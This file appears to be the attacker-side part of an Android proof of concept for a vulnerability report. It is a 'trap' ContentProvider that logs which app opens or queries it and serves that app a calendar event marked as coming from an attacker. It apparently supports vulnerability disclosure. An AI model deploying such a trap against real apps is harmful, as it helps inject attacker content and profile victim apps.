package com.vrppoc;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

public class TrapProvider extends ContentProvider {
    private static final String TAG = "VRP_TRAP";
    public static int callerUid = -1;
    public static String callerPkg = null;

    @Override
    public boolean onCreate() { return true; }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
        callerUid = android.os.Binder.getCallingUid();
        callerPkg = getCallingPackage();
        Log.d(TAG, "openFile called by UID=" + callerUid + " pkg=" + callerPkg + " uri=" + uri);

        File f = new File(getContext().getCacheDir(), "trap.ics");
        try {
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(("BEGIN:VCALENDAR\r\nVERSION:2.0\r\n" +
                "BEGIN:VEVENT\r\nSUMMARY:TRAP_EVENT_FROM_ATTACKER\r\n" +
                "DTSTART:20260101T120000Z\r\nDTEND:20260101T130000Z\r\n" +
                "UID:trap-event-1@attacker.com\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n").getBytes());
            fos.close();
        } catch (IOException e) {
            throw new FileNotFoundException("Cannot create trap file");
        }
        return ParcelFileDescriptor.open(f, ParcelFileDescriptor.MODE_READ_ONLY);
    }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        callerUid = android.os.Binder.getCallingUid();
        callerPkg = getCallingPackage();
        Log.d(TAG, "query called by UID=" + callerUid + " pkg=" + callerPkg);
        return null;
    }

    @Override
    public String getType(Uri uri) { return "text/calendar"; }
    @Override
    public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override
    public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override
    public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
